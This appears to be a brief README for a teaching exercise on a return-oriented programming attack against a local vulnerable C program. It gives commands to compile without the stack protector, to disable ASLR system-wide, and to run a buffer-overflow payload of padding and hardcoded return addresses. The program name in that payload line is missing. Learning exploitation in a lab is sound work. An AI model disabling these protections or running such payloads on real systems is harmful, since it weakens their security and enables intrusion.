#ROP-Attack
In this example you should compile with the following command:

gcc -fno-stack-protector -o rop rop.c  

If you have any questions about the Stack-Protector, please ask.

You should also turn ASLR off (super-user privileges are needed):  
echo 0 | tee /proc/sys/kernel/randomize_va_space  

Please make sure, that you have enough knowledge of the x86_x64-architecture, assembler and shellcodes.

In this step, you need to find out the address of the vuln-Function. Also you should should find out how many bytes you need to overwrite.

After that you can run the program with the following command. Please correct them with the right return address:  
./ "$(python -c 'print "A"*0x6c + "BBBB" + "\x60\x83\x04\x08" + "CCCC" + "\x80\x85\x04\x08"')"
